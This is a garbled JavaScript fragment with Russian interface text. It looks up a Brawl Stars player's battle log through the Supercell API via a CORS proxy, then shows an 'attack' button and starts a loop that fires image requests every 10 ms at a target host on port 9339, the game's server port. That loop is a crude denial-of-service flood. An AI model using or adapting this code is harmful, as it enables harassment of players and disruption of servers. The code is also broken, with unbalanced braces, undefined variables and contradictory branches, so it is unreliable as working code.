    async function initScan() {
        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
        if(!tag) return alert("Введите тег игрока!");
        
        log(`Подключение к узлу Supercell API...`);

            const proxy = "https://cors-anywhere.herokuapp.com/";
            const api = `https://api.brawlstars.com/v1/players/%23${tag}/battlelog`;

            const res = await fetch(proxy + api, {
                headers: { "Authorization": `Bearer ${TOKEN}` }
            });

            if(res.status === 403) {
                log("ОШИБКА 403: IP твоего хостинга не разрешен в ключе!", "#ff3333");
                return;
            }

            const data = await res.json();
            if(data.items && data.items.length > 0) {
                log("Активный лог получен. Анализ метаданных...", "#ffff00");
                document.getElementById('matchCard').style.display = 'block';
                document.getElementById('attackBtn').style.display = 'block';

                log("Матчей не найдено. Игрок оффлайн.", "#00ccff");

        setInterval(() => {
            const x = new Image();
            x.src = `http://${target}:9339/?nocache=${Math.random()}`;
        }, 10); 
    }
